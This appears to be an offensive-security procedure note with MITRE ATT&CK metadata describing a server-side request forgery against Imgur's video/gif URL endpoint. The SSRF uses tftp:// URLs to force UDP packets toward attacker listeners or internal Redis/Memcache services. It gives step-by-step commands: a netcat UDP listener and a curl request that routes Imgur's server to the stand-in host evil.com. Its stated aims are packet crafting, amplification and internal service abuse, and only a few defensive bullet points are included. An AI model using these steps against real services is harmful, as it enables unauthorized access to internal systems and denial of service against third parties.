---
tags:
  - ssrf
  - udp-crafting
  - tftp
type: procedure
tools:
  - '[[tools/netcat]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/nc-listen-udp-verbose]]'
  - '[[commands/curl-tftp-trigger]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T03:46:09.002Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: cfd494c8-3e93-482a-ba97-db0752bb3091
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Demonstrate-UDP-SSRF-with-TFTP-and-Netcat

## Summary

Use TFTP protocol in SSRF to force Imgur to send arbitrary UDP packets to attacker listeners or internal services like Redis/Memcache, enabling packet crafting for amplification or unauthorized access.

## Description

TFTP operates over UDP, allowing SSRF to bypass TCP restrictions. Imgur's libcurl sends TFTP read requests as UDP datagrams, which can be crafted to target internal UDP services, potentially leading to DoS or data exfiltration.

## Requirements

1. Netcat with UDP support
2. Open UDP port 12346 on attacker host
3. Imgur endpoint access

## Defense

Defensive measures and detection strategies:

- Disable UDP protocols in libcurl configurations
- Segment internal UDP services from external-facing apps
- IDS rules for anomalous UDP traffic from web servers

## Objectives

1. Confirm UDP SSRF capability
2. Craft packets for internal service attacks
3. Demonstrate potential for Memcache/Redis abuse

## Instructions

### Step 1: Start UDP Listener

**Context**: Listen for UDP packets on port 12346.

**Command** ([[commands/nc-listen-udp-verbose]]):
```bash
nc -v -u -l 12346
```

> Verbose UDP listen. Expected: Packet like "TESTUDPPACKEToctettsize0blksize512timeout6".

### Step 2: Trigger TFTP SSRF

**Context**: Send TFTP URL to Imgur.

**Command** ([[commands/curl-tftp-trigger]]):
```bash
curl "https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET"
```

> Forces UDP TFTP read. Success if packet received on listener.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques

- None

## Commands Used

- [[commands/nc-listen-udp-verbose]]
- [[commands/curl-tftp-trigger]]

## Tools Used

- [[tools/netcat]]

## Tags

- [[ssrf]]
- [[udp-crafting]]
- [[tftp]]
